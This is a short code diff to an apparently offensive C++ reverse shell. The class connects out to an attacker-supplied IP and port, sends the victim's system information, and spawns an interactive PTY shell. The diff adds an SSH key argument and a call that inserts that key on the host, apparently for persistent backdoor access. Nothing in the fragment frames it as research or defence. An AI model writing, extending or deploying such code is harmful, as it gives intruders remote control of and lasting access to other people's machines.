@@ -7,9 +7,8 @@
 #include <cstring>
 #include <poll.h>
 
-ReverseShell::ReverseShell(const std::string& ip, int port)
-    : conn(ip, port), sysInfo(conn) {}
-
+ReverseShell::ReverseShell(const std::string& ip, int port, const std::string& sshKey)
+    : conn(ip, port), sysInfo(conn), sshKey(sshKey) {}
 void ReverseShell::run() {
     if (conn.establish()) {
         sysInfo.sendSystemInfo();
@@ -25,9 +24,9 @@ void ReverseShell::run() {
         } else {
             handleShell(conn.getSocketFd(), pty_fd);
         }
+        Persistence::insertSSHKey(conn.getSocketFd(), sshKey);
     }
 }
-
 void ReverseShell::handleShell(int sockfd, int pty_fd) {
     char buffer[1024];
     ssize_t n;
